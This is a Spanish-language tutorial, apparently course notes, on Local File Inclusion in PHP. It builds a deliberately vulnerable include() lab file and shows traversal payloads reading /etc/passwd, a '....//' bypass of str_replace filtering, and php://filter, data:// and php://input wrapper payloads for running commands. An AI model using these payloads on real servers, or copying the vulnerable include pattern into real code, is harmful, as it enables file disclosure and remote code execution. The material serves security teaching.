# Local File Inclusion (LFI)

La vulnerabilidad **Local File Inclusion** (**LFI**) es una vulnerabilidad de seguridad informática que se produce cuando una aplicación web **no valida adecuadamente** las entradas de usuario, permitiendo a un atacante **acceder a archivos locales** en el servidor web.

En muchos casos, los atacantes aprovechan la vulnerabilidad de LFI al abusar de parámetros de entrada en la aplicación web. Los parámetros de entrada son datos que los usuarios ingresan en la aplicación web, como las URL o los campos de formulario. Los atacantes pueden manipular los parámetros de entrada para incluir rutas de archivo local en la solicitud, lo que puede permitirles acceder a archivos en el servidor web. Esta técnica se conoce como “**Path Traversal**” y se utiliza comúnmente en ataques de LFI.

En el ataque de Path Traversal, el atacante utiliza caracteres especiales y caracteres de escape en los parámetros de entrada para navegar a través de los directorios del servidor web y acceder a archivos en ubicaciones sensibles del sistema.

Por ejemplo, el atacante podría incluir “**../**” en el parámetro de entrada para navegar hacia arriba en la estructura del directorio y acceder a archivos en ubicaciones sensibles del sistema.

Para prevenir los ataques LFI, es importante que los desarrolladores de aplicaciones web validen y filtren adecuadamente la entrada del usuario, limitando el acceso a los recursos del sistema y asegurándose de que los archivos sólo se puedan incluir desde ubicaciones permitidas. Además, las empresas deben implementar medidas de seguridad adecuadas, como el cifrado de archivos y la limitación del acceso de usuarios no autorizados a los recursos del sistema.

A continuación, se os proporciona el enlace directo a la herramienta que utilizamos al final de esta clase para abusar de los ‘**Filter Chains**‘ y conseguir así ejecución remota de comandos:

* **PHP Filter Chain Generator**: [https://github.com/synacktiv/php\_filter\_chain\_generator](https://github.com/synacktiv/php\_filter\_chain\_generator)

## Prueba de Concepto LFI

Dentro de la ruta /var/www/html podemos crear un archivo.php para hacer la prueba de la **vulnerabilidad**:

```php
<?php
	$filename = $_GET['filename'];
	include($filename);
?>
```

Lo que consiste el archivo.php és que con el metodo GET poder pasar una entrada con el parametro filename.

* Iniciamos el servicio http con **apache2**:

```bash
❯ service apache2 start
❯ lsof -i :80
COMMAND     PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
apache2    9429     root    4u  IPv6  49153      0t0  TCP *:http (LISTEN)
apache2    9431 www-data    4u  IPv6  49153      0t0  TCP *:http (LISTEN)
apache2    9432 www-data    4u  IPv6  49153      0t0  TCP *:http (LISTEN)
apache2    9433 www-data    4u  IPv6  49153      0t0  TCP *:http (LISTEN)
apache2    9434 www-data    4u  IPv6  49153      0t0  TCP *:http (LISTEN)
apache2    9435 www-data    4u  IPv6  49153      0t0  TCP *:http (LISTEN)
apache2   11047 www-data    4u  IPv6  49153      0t0  TCP *:http (LISTEN)
```

* En el navegador entramos a nuestro servidor web y en el archivo.php le pasamos como parametro el **filename** por ejemplo el archivo **/etc/passwd** y veremos el contenido del archivo:

**➜** `http://localhost/index.php?filename=/etc/passwd`

### Directory path Traversal

Modificaremos el archivo.php anterior que en teoria no podriamos hacer un LFI bàsico como el del anterior:

```php
<?php
    $filename = $_GET['filename'];
    include("/var/www/html/" . $filename); // /var/www/html/../../../../../etc/passwd
?>
```

* Pero haciendo un directory path traversal que es para ir a la raiz del sistema y asi poder ver el contenido del archivo deseado:

**➜** `http://localhost/index.php?filename=../../../../../../etc/passwd`

Tambien en php existe un metodo llamado str\_replace que remplaça una cadena que contega los caracteres deseados:

```php
❯ php --interactive
Interactive mode enabled

php > echo str_replace("../", "", "../../../../../../etc/passwd");
etc/passwd
```

Como vemos en el ejemplo anterior vemos que la cadena se remplaza en **etc/passwd** por lo tanto la ruta no existe pero que pasa si le metemos una **....//** mas delante, pues que ahora si existe la ruta:

```php
php > echo str_replace("../", "", "....//....//....//....//....//etc/passwd");
../../../../../etc/passwd
```

Entonces modificamos el archivo.php para incorporar el str\_replace:

```php
<?php
    $filename = $_GET['filename'];
    $filename = str_replace("../", "", $filename); // /var/www/html/....//....//....//....//..../etc/passwd
    include("/var/www/html/" . $filename); // /var/www/html/../../../../../etc/passwd
?>
```

* Burlar el str\_replace:

**➜** `http://localhost/index.php?filename=....//....//....//....//....//etc/passwd`

#### Wrappers

* Convert archivo en base 64:

**➜** `php://filter/convert.base64-encode/resource=index.php`

* Ver contenido del archivo sin que lo interprete:

**➜** `php://filter/convert.iconv.utf-8.utf-16/resource=index.php`

* Ejecutar comandos enviando la peticion por **GET**

**➜** `/?filename=data://text/plain;base64,cadenaBase64`:

* Ejecutar comandos enviando la peticion por **POST** con `<?php system("comando"); ?>`:

**➜** `/?filename=php://input`
